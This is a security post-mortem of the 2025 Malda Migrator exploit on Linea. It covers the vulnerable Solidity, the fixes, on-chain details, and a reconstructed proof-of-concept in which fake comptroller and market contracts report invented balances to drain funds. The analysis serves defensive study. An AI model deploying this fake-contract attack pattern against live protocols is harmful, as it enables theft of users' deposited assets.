# Malda — Migrator Unvalidated Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-05-30 |
| **Protocol** | Malda (Linea lending protocol based on Mendi Finance) |
| **Chain** | Linea |
| **Loss** | ~$273,000 (USDC, WETH, USDT, WBTC, wstETH, ezETH, weETH, wrsETH, and other tokens) |
| **Attacker EOA** | [0x370a...2910](https://lineascan.build/address/0x370a8Db1F020CE70E8eAB2502c739844Ca2C2910) |
| **Attack Contract** | [0xb1e2...74f](https://lineascan.build/address/0xb1e2c543035dc0ca845f91aec68f8a891ea5d74f) |
| **Attack Tx** | [0x7ffb...e5d](https://lineascan.build/tx/0x7ffb4569827ed3acd595270c755195da5c630a1ad999afe6eb9b884ff09d6e5d) |
| **Vulnerable Contract** | Malda Migrator Contract |
| **Fake Comptroller** | [0xbc01...1f2b](https://lineascan.build/address/0xbc0147742882abcd1aeaf9c0ee5f55333fc81f2b) |
| **Root Cause** | Migrator contract trusts user-supplied contract addresses without validation — allows fake position migration via fake Mendi market contracts |
| **PoC Source** | DeFiHackLabs (not registered for 2025-05 — reconstructed from on-chain data and CoinsBench analysis) |

---

## 1. Vulnerability Overview

Malda is a ZK proof-based multi-chain lending/borrowing protocol operating on the Linea chain. The protocol provided a `Migrator` contract to allow Mendi Finance users to easily transfer existing positions to Malda.

**Core Vulnerability**: The `migrateAllPositions()` function of the `Migrator` contract **trusted the user-supplied `mendiComptroller` address without any validation** and performed external calls against it. The attacker executed the following manipulation:

1. Deployed a fake Mendi Comptroller contract (`0xbc01...`) and 7 fake Market contracts
2. Implemented fake contract's `balanceOfUnderlying()` to return attacker-controlled values
3. Fake `transferFrom()` always returns `true` without actual token movement
4. Called `migrateAllPositions(fakeComptroller, ...)` → Malda treated the fraudulent positions as valid
5. Issued mTokens without real collateral → drained protocol funds

This vulnerability was confined to the migrator contract; the core lending logic and ZK infrastructure were not compromised.

---

## 2. Vulnerable Code Analysis

### 2.1 `migrateAllPositions()` — Unchecked Trust of External Contracts (Core Vulnerability)

```solidity
// ❌ Vulnerable code — Migrator.sol
function migrateAllPositions(
    address mendiComptroller,   // ⚠️ Dangerous: user-supplied address — no validation
    address[] calldata markets, // ⚠️ Dangerous: fake market contract array can be injected
    MigrateParams calldata params
) external {
    // 🔴 Critical flaw: does not verify mendiComptroller is the official address
    // Attacker can pass any arbitrary malicious contract
    IComptroller comptroller = IComptroller(mendiComptroller);

    for (uint256 i = 0; i < markets.length; i++) {
        IMendiMarket market = IMendiMarket(markets[i]);

        // 🔴 Fake contract's balanceOfUnderlying() returns attacker-controlled value
        uint256 supplyBalance = market.balanceOfUnderlying(msg.sender);

        // 🔴 Fake contract's borrowBalanceStored() also returns fraudulent value
        uint256 borrowBalance = market.borrowBalanceStored(msg.sender);

        // 🔴 Fake transferFrom() returns true without actual movement
        // Position is created even though no real collateral is transferred to Malda
        market.transferFrom(msg.sender, address(this), supplyBalance);

        // 🔴 Requests mToken issuance from Malda based on fraudulent supplyBalance
        _mintMaldaPosition(params.maldaMarket, supplyBalance, borrowBalance);
    }
}
```

```solidity
// ✅ Fixed code — Migrator.sol
// Hardcode the official Mendi Comptroller address as a constant
address private constant OFFICIAL_MENDI_COMPTROLLER =
    0x1337BeEf...;  // Official Mendi Comptroller address

// Official Mendi Market whitelist
mapping(address => bool) private approvedMendiMarkets;

modifier onlyOfficialComptroller(address comptroller) {
    // ✅ Only allow official Comptroller address
    require(
        comptroller == OFFICIAL_MENDI_COMPTROLLER,
        "Migrator: unauthorized Comptroller address"
    );
    _;
}

function migrateAllPositions(
    address mendiComptroller,
    address[] calldata markets,
    MigrateParams calldata params
) external onlyOfficialComptroller(mendiComptroller) {
    for (uint256 i = 0; i < markets.length; i++) {
        // ✅ Only allow official markets registered in the whitelist
        require(
            approvedMendiMarkets[markets[i]],
            "Migrator: unauthorized market address"
        );

        IMendiMarket market = IMendiMarket(markets[i]);
        uint256 supplyBalance = market.balanceOfUnderlying(msg.sender);
        uint256 borrowBalance = market.borrowBalanceStored(msg.sender);

        // ✅ Verify transferFrom result + confirm actual transferred amount
        uint256 balanceBefore = IERC20(market.underlying()).balanceOf(address(this));
        market.transferFrom(msg.sender, address(this), supplyBalance);
        uint256 actualTransferred = IERC20(market.underlying()).balanceOf(address(this)) - balanceBefore;

        // ✅ Create position only for the amount actually transferred
        _mintMaldaPosition(params.maldaMarket, actualTransferred, borrowBalance);
    }
}
```

**Problem**: `mendiComptroller` and the `markets` array are passed directly as user input, with absolutely no logic to verify whether those addresses are official Mendi Finance contracts. An attacker could deploy malicious contracts that return fraudulent values, inject them into the migrator, and create borrow positions without any real collateral.

---

### 2.2 Fake Mock Contracts — Returning Fraudulent Balances

```solidity
// ❌ Fake Mendi Market deployed by attacker (vulMendiMarket)
contract FakeMendiMarket {
    address public attacker;
    uint256 private fakeSupplyBalance;
    uint256 private fakeBorrowBalance;

    constructor(address _attacker, uint256 _supply, uint256 _borrow) {
        attacker = _attacker;
        // Set arbitrary balances as desired by attacker
        fakeSupplyBalance = _supply;
        fakeBorrowBalance = _borrow;
    }

    // 🔴 Returns attacker-specified value instead of real balance
    function balanceOfUnderlying(address) external returns (uint256) {
        return fakeSupplyBalance;
    }

    // 🔴 Returns fraudulent borrow balance without any real borrowing
    function borrowBalanceStored(address) external view returns (uint256) {
        return fakeBorrowBalance;
    }

    // 🔴 Returns success without any actual token movement
    function transferFrom(address, address, uint256) external returns (bool) {
        return true;  // Always succeeds with no processing
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker (0x370a...) deployed malicious contracts prior to executing the attack transaction:
- 1 fake Mendi Comptroller: `0xbc01...`
- 7 fake Mendi Markets: `0x3dfd...` and 6 others
- 1 MockToken: `0x323d...`
- Attack orchestrator contract: `0xb1e2...`

### 3.2 Execution Phase

```
Attacker EOA
0x370a...2910
        │
        │ 1. Deploy attack contract + initialize fake contracts
        ▼
┌─────────────────────────────┐
│  Attack Contract            │
│  0xb1e2...74f               │
│                             │
│  - Deploy vulComptrollerMendi│
│  - Deploy vulMendiMarket x7 │
│  - Deploy MockToken         │
└─────────────────────────────┘
        │
        │ 2. migrateAllPositions(fakeComptroller, fakeMarkets, ...)
        ▼
┌─────────────────────────────┐
│  Malda Migrator Contract    │  ← 🔴 Vulnerable point
│                             │
│  ❌ No comptroller validation│
│  ❌ No market validation    │
└─────────────────────────────┘
        │
        │ 3. Call market.balanceOfUnderlying()
        ▼
┌─────────────────────────────┐
│  Fake MendiMarket x7        │
│  0x3dfd... and 6 others     │
│                             │
│  → Returns fake supply balance   │
│  → Returns fake borrow balance   │
│  → transferFrom: returns true│  ← No actual token movement
└─────────────────────────────┘
        │
        │ 4. Issue Malda mTokens based on fraudulent balances
        ▼
┌─────────────────────────────┐
│  Malda Core Protocol        │
│  (mErc20Host, Operator, etc)│
│                             │
│  ← mTokens issued without real collateral│
│  ← Fraudulent positions registered      │
└─────────────────────────────┘
        │
        │ 5. Borrow/withdraw real assets using fraudulent positions
        ▼
┌─────────────────────────────┐
│  Malda Liquidity Pool       │
│                             │
│  USDC, WETH, USDT           │
│  WBTC, wstETH, ezETH        │
│  weETH, wrsETH, etc.        │
└─────────────────────────────┘
        │
        │ 6. Transfer drained assets
        ▼
Attacker EOA (profit)
Total loss ~$273,000

Block 19512428 (2025-05-30 18:51:54 UTC)
Gas used: 8,960,483 / 10,000,000 (89.6%)
```

### 3.3 Results

| Stolen Token | Estimated Amount |
|-----------|-----------|
| ezETH | ~$57,513 |
| WETH | ~$40,560 |
| USDC | ~$24,555 |
| WBTC | ~$16,732 |
| wstETH | ~$4,001 |
| USDT | ~$681 |
| weETH, wrsETH, etc. | remainder |
| **Total** | **~$273,000** |

---

## 4. PoC Code Excerpt

> No official DeFiHackLabs PoC registered. Reconstructed from CoinsBench analysis and on-chain data.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Malda Migrator Vulnerability Conceptual PoC
// Attack date: 2025-05-30
// Attack TX: 0x7ffb4569827ed3acd595270c755195da5c630a1ad999afe6eb9b884ff09d6e5d
// Chain: Linea (Block #19512428)

interface IMaldaMigrator {
    struct MigrateParams {
        address maldaMarket;
        // ... other parameters
    }

    // 🔴 Vulnerable function: does not validate comptroller and markets
    function migrateAllPositions(
        address mendiComptroller,
        address[] calldata markets,
        MigrateParams calldata params
    ) external;
}

// Step 1: Deploy fake Comptroller
contract FakeComptroller {
    // Implement all functions called by the migrator to return success
    function getAssetsIn(address account) external returns (address[] memory) {
        // Return list of fake markets controlled by attacker
        address[] memory markets = new address[](7);
        // ... populate with fake market addresses
        return markets;
    }
}

// Step 2: Deploy fake Markets (7 total, one per token)
contract FakeMendiMarket {
    uint256 private fakeSupply;

    constructor(uint256 _fakeSupply) {
        fakeSupply = _fakeSupply;
    }

    // 🔴 Returns attacker-specified value instead of real balance → Malda trusts this value
    function balanceOfUnderlying(address) external returns (uint256) {
        return fakeSupply;
    }

    function borrowBalanceStored(address) external view returns (uint256) {
        return 0; // Disguised as a position with no borrows
    }

    // 🔴 Returns success without actual token movement → position created without collateral
    function transferFrom(address, address, uint256) external returns (bool) {
        return true;
    }

    // underlying() — returns real token address (migrator does not verify)
    function underlying() external view returns (address) {
        return address(0x...); // Real asset token address
    }
}

// Step 3: Attack orchestration
contract MaldaAttack {
    IMaldaMigrator constant MIGRATOR = IMaldaMigrator(0x...); // Malda Migrator

    function attack() external {
        // Deploy fake contracts
        FakeComptroller fakeComptroller = new FakeComptroller();
        address[] memory fakeMarkets = new address[](7);
        for (uint i = 0; i < 7; i++) {
            // Create fake market with fraudulent balance for each token
            fakeMarkets[i] = address(new FakeMendiMarket(type(uint128).max));
        }

        // Execute migration — inject fake Comptroller + fake Markets
        // 🔴 Malda Migrator trusts them without address validation
        IMaldaMigrator.MigrateParams memory params = IMaldaMigrator.MigrateParams({
            maldaMarket: address(0x...) // Real Malda mToken address
        });

        MIGRATOR.migrateAllPositions(
            address(fakeComptroller), // 🔴 Inject fake Comptroller
            fakeMarkets,              // 🔴 Inject fake Markets array
            params
        );

        // After: borrow/withdraw real assets using fraudulently issued mTokens
        // → ~$273,000 drained
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Migrator unvalidated external contract address (Unvalidated External Input) | CRITICAL | CWE-20 |
| V-02 | Accepting return values from untrusted external calls (Unchecked Return Value from Untrusted Source) | CRITICAL | CWE-252 |
| V-03 | Missing access control — no permission restriction on migration function (Missing Access Control) | HIGH | CWE-284 |
| V-04 | Missing actual asset transfer verification (Missing Asset Transfer Verification) | HIGH | CWE-345 |

### V-01: Migrator Unvalidated External Contract Address

- **Description**: The `migrateAllPositions()` function does not verify whether the addresses passed as `mendiComptroller` and `markets` parameters are official Mendi Finance contracts. Any arbitrary contract address can impersonate the Mendi protocol.
- **Impact**: An attacker can deploy malicious contracts and impersonate the official protocol, causing the Malda migrator to treat non-existent positions as valid.
- **Attack Conditions**: Exploitable by anyone as long as the migrator contract is deployed and the attacker can deploy arbitrary contracts.

### V-02: Accepting Return Values from Untrusted External Calls

- **Description**: Return values from external contract functions such as `balanceOfUnderlying()`, `borrowBalanceStored()`, and `transferFrom()` are trusted without validation, allowing fraudulent values unrelated to actual asset state to be used in position calculations.
- **Impact**: Positions representing arbitrary amounts can be created without real collateral.
- **Attack Conditions**: Exploited in combination with V-01.

### V-03: Missing Access Control — No Permission Restriction on Migration Function

- **Description**: The `migrateAllPositions()` function has no restriction limiting access to officially authenticated Mendi Finance users. There is no identity verification mechanism such as a whitelist or Merkle proof.
- **Impact**: Any address can call the migration function with arbitrary parameters.
- **Attack Conditions**: No restriction on function call permissions.

### V-04: Missing Actual Asset Transfer Verification

- **Description**: After calling `transferFrom()`, there is no verification that tokens were actually transferred (e.g., checking balance differences). Only the `true` return value is used to determine transfer success.
- **Impact**: Positions are created even without real collateral.
- **Attack Conditions**: When a fake ERC-20 contract's `transferFrom()` is implemented to always return `true`.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Hardcode the official Comptroller address
address private constant OFFICIAL_MENDI_COMPTROLLER =
    0xAbCd...;  // Fixed to official Mendi Comptroller address at deployment

// ✅ Fix 2: Maintain official Market whitelist
mapping(address => bool) public isApprovedMendiMarket;

function setApprovedMarket(address market, bool approved)
    external
    onlyOwner
{
    isApprovedMendiMarket[market] = approved;
    emit MarketApprovalChanged(market, approved);
}

// ✅ Fix 3: Add validation modifier
modifier validateMigrationParams(
    address comptroller,
    address[] calldata markets
) {
    require(
        comptroller == OFFICIAL_MENDI_COMPTROLLER,
        "Migrator: only official Mendi Comptroller allowed"
    );
    for (uint256 i = 0; i < markets.length; i++) {
        require(
            isApprovedMendiMarket[markets[i]],
            "Migrator: unauthorized market address"
        );
    }
    _;
}

// ✅ Fix 4: Verify actual transferred amount
function _safeTransferAndVerify(
    address token,
    address from,
    address to,
    uint256 expectedAmount
) internal returns (uint256 actualAmount) {
    uint256 balanceBefore = IERC20(token).balanceOf(to);
    IERC20(token).transferFrom(from, to, expectedAmount);
    actualAmount = IERC20(token).balanceOf(to) - balanceBefore;
    // Fail if actual transferred amount is 0
    require(actualAmount > 0, "Migrator: no actual token transfer");
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Unvalidated external address (V-01) | Declare official protocol addresses as immutable constants; apply whitelist pattern |
| Trusting return values (V-02) | Verify actual state changes by comparing balance snapshots before/after external calls |
| Missing access control (V-03) | Verify legitimate migration users via signatures or Merkle proofs issued by Mendi Finance |
| Missing transfer verification (V-04) | Apply CEI (Checks-Effects-Interactions) pattern; verify actual transfer via balance comparison |
| Common | Set daily rate limits on migration functions; block abnormally large position migrations |
| Common | Do not deploy migrator contracts separately prior to independent security audits |
| Common | Principle of Least Privilege — migrator should hold only the permissions it actually needs |

---

## 7. Lessons Learned

1. **Always validate external contract addresses**: Contract addresses supplied by users must never be trusted unconditionally. Official protocol addresses should be hardcoded as immutable constants at deployment, or only allowed via a governance-managed whitelist.

2. **Validate return values and actual state separately**: The `bool` return value of `transferFrom()` does not guarantee actual token movement. Tokens that do not conform to the ERC-20 standard, or malicious contracts, can always return `true`. Actual state changes must be verified by comparing balance snapshots (before/after).

3. **Peripheral contracts are also subject to core security review**: Peripheral contracts that provide convenience features — such as migrators and routers — are directly connected to the core protocol and require an equivalent level of security audit. In this incident, the core logic was secure, but funds were drained through a vulnerability in a peripheral contract.

4. **Validate complex migration logic step by step**: Logic that reads the state of another protocol and creates positions in the current protocol has complex trust boundaries. The source and trustworthiness of input data must be clearly defined, and state consistency must be verified at each step.

5. **Exercise extra caution when expanding DeFi on new L2s like Linea**: The security review may be insufficient when rapidly launching features in the L2 ecosystem. In particular, migration features from existing protocols to new chains/protocols can open new attack vectors.

6. **Parallels with the Exactly Protocol (2023) incident**: The pattern of trusting user-supplied contract addresses without validation in peripheral contracts is being repeatedly exploited. The "arbitrary contract trust" pattern from `03_access_control.md` should be applied to all external inputs.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Field | Value |
|------|-----|
| TX Hash | 0x7ffb4569827ed3acd595270c755195da5c630a1ad999afe6eb9b884ff09d6e5d |
| Block Number | 19512428 |
| Timestamp | 2025-05-30 18:51:54 UTC |
| From | 0x370a8Db1F020CE70E8eAB2502c739844Ca2C2910 |
| To (Attack Contract) | 0xb1e2c543035dc0ca845f91aec68f8a891ea5d74f |
| Gas Used | 8,960,483 / 10,000,000 (89.6%) |
| Status | Success |

### 8.2 ERC-20 Transfer Events (On-Chain Verified)

| Token | Amount (Estimated) | Direction |
|------|------------|------|
| USDC | ~$24,555 | Malda Protocol → Attack Contract |
| WETH | ~$40,560 | Malda Protocol → Attack Contract |
| USDT | ~$681 | Malda Protocol → Attack Contract |
| WBTC | ~$16,732 | Malda Protocol → Attack Contract |
| wstETH | ~$4,001 | Malda Protocol → Attack Contract |
| ezETH | ~$57,513 | Malda Protocol → Attack Contract |
| weETH, wrsETH, etc. | remaining ~$129,000 | Malda Protocol → Attack Contract |

### 8.3 Contracts Created During the Attack

11 new contracts were created during a single transaction execution:
- Fake Comptroller: `0xbc0147742882abcd1aeaf9c0ee5f55333fc81f2b`
- Fake MendiMarket: `0x3dfde4a2ba456ffba2d025d7c715bc5ee06dfa7b` and 6 others
- MockToken: `0x323d056b8f99990796dc672464b01c00d59d88bc`

### 8.4 Post-Incident Actions

- Protocol paused immediately after the attack (to protect core lending logic)
- Attacker address identified and on-chain negotiation attempted
- Operation Phoenix recovery plan established (USDC-based compensation based on position value)
- Integration of Linea's Phylax Credible Layer security system (post-resumption)

---

## References

- [The Road to Recovery — Malda (Mirror.xyz)](https://mirror.xyz/0x4Da818DD3aAfb9D042a76B5037cdBa61533C7692/gok1E5z0NeqQGtbnPHPfa7ZsASmU03Jvpa42N6mQkIA)
- [Malda Hack: No Validation And Full Access (CoinsBench)](https://coinsbench.com/malda-hack-no-validation-and-full-access-75ac787aae28)
- [Attack TX (Lineascan)](https://lineascan.build/tx/0x7ffb4569827ed3acd595270c755195da5c630a1ad999afe6eb9b884ff09d6e5d)
- [Attacker Address (Lineascan)](https://lineascan.build/address/0x370a8Db1F020CE70E8eAB2502c739844Ca2C2910)
- [Sherlock Audit — Malda 2025-07 Security Architecture Analysis (DeepWiki)](https://deepwiki.com/sherlock-audit/2025-07-malda/2.4-security-and-access-control)
- [Linea × Phylax Credible Layer Integration (The Block)](https://www.theblock.co/post/386915/consensys-backed-linea-integrates-phylaxs-credible-layer-to-proactive-prevent-smart-contract-exploits)
- Related pattern: `/home/gegul/skills/patterns/03_access_control.md`
- Similar incident: `2023-08-18_ExactlyProtocol_PeripheralAccessControl_OP.md`